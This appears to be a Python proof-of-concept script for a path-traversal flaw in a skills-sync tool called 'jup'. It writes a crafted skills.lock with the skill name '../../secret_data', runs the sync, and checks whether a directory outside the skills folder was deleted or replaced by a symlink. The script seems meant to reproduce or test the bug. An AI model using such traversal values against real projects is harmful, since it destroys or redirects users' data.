import os
from pathlib import Path
import json
import shutil
import sys

# Mocking the environment
HOME = Path("/tmp/jup-test-home")
PROJECT = Path("/tmp/jup-test-project")

if HOME.exists(): shutil.rmtree(HOME)
if PROJECT.exists(): shutil.rmtree(PROJECT)

HOME.mkdir(parents=True)
PROJECT.mkdir(parents=True)

# 1. Setup target to be deleted
SECRET_DIR = PROJECT / "secret_data"
SECRET_DIR.mkdir()
(SECRET_DIR / "flag.txt").write_text("sensitive")

# 2. Setup storage directory for skills
STORAGE_DIR = HOME / ".jup" / "skills" / "misc" / "gh" / "owner" / "repo"
STORAGE_DIR.mkdir(parents=True)

# 3. Setup target base (where jup will try to link/copy skills)
TARGET_BASE = PROJECT / ".agents" / "skills"
TARGET_BASE.mkdir(parents=True)

# 4. Create malicious skills.lock
# We want target_skill_dir = TARGET_BASE / skill = SECRET_DIR
# TARGET_BASE is /tmp/jup-test-project/.agents/skills
# SECRET_DIR is /tmp/jup-test-project/secret_data
# skill should be ../../secret_data
skill_name = "../../secret_data"

lock_content = {
    "version": "0.1.0",
    "sources": {
        "owner/repo": {
            "source_type": "github",
            "repo": "owner/repo",
            "category": "misc",
            "source_layout": "collection",
            "skills": [skill_name]
        }
    }
}

with open(TARGET_BASE / "skills.lock", "w") as f:
    json.dump(lock_content, f)

# 5. Ensure skill_src_dir exists
# skill_src_dir = STORAGE_DIR / skill_name
# = /tmp/jup-test-home/.jup/skills/misc/gh/owner/repo / "../../secret_data"
# = /tmp/jup-test-home/.jup/skills/misc/gh/secret_data
skill_src_dir = STORAGE_DIR / skill_name
skill_src_dir.mkdir(parents=True, exist_ok=True)
(skill_src_dir / "SKILL.md").write_text("malicious skill")

# 6. Mock jup and run sync
sys.path.append("/Users/rubens/projects/jup/src")
os.environ["HOME"] = str(HOME)

from jup.commands.sync import sync_logic
import jup.config

def mocked_get_config():
    from jup.models import JupConfig, ScopeType
    return JupConfig(scope=ScopeType.LOCAL)
jup.config.get_config = mocked_get_config

os.chdir(PROJECT)

import jup.commands.sync
jup.commands.sync.verbose_state.verbose = True
jup.commands.sync.get_skills_storage_dir = lambda: HOME / ".jup" / "skills"

print(f"Secret dir exists: {SECRET_DIR.exists()}")
...
try:
    sync_logic()
except Exception as e:
    print(f"Sync failed: {e}")

if not SECRET_DIR.exists() or SECRET_DIR.is_symlink():
    print(f"SUCCESS: Destructive traversal worked! {SECRET_DIR} was replaced or deleted.")
    if SECRET_DIR.is_symlink():
        print(f"It is now a symlink pointing to: {os.readlink(SECRET_DIR)}")
else:
    print(f"FAILURE: {SECRET_DIR} still exists and is not a symlink.")
